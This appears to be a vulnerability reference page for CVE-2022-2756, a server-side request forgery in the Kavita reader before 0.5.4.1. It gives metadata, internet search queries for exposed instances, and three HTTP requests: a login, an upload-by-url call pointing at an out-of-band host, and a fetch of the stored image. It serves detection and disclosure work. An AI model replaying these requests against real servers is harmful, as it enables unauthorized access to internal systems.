---
layout: "post"
cve_id: "CVE-2022-2756"
title: "Kavita <0.5.4.1 - Server-Side Request Forgery"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-2756.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-2756.yaml"
author: "theamanrawat"
severity: "medium"
impact: "Successful exploitation of this vulnerability can result in unauthorized access to sensitive information or systems, leading to potential data breaches or further attacks.
"
remediation: "Fixed in 0.5.4.1."
reference:
  - "https://huntr.dev/bounties/95e7c181-9d80-4428-aebf-687ac55a9216/"
  - "https://github.com/kareadita/kavita"
  - "https://github.com/kareadita/kavita/commit/9c31f7e7c81b919923cb2e3857439ec0d16243e4"
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-2756"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N', 'cvss-score': 6.5, 'cve-id': 'CVE-2022-2756', 'cwe-id': 'CWE-918', 'epss-score': 0.67466, 'epss-percentile': 0.98511, 'cpe': 'cpe:2.3:a:kavitareader:kavita:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 3, 'vendor': 'kavitareader', 'product': 'kavita', 'shodan-query': ['title:"kavita"', 'http.title:"kavita"'], 'fofa-query': 'title="kavita"', 'google-query': 'intitle:"kavita"'}"
tags:
  - "cve"
  - "cve2022"
  - "ssrf"
  - "kavita"
  - "authenticated"
  - "huntr"
  - "intrusive"
  - "kavitareader"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
Kavita before 0.5.4.1 is susceptible to server-side request forgery in GitHub repository kareadita/kavita. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.


## ðŸŒ HTTP Request
```nohighlight
POST /api/account/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.2
Connection: close
Content-Length: 41
Accept: application/json, text/plain, */*
Content-Type: application/json
Accept-Encoding: gzip

{"username":"rt5PLc","password":"O3DwER"}
```

```nohighlight
POST /api/upload/upload-by-url HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
Connection: close
Content-Length: 30
Accept: application/json, text/plain, */*
Authorization: Bearer u7EcCP
Content-Type: application/json
Accept-Encoding: gzip

{"url":"http://oast.me/#.png"}
```

```nohighlight
GET /api/image/cover-upload?filename=coverupload_0VrXtI.png HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36
Connection: close
Authorization: Bearer u7EcCP
Accept-Encoding: gzip
```

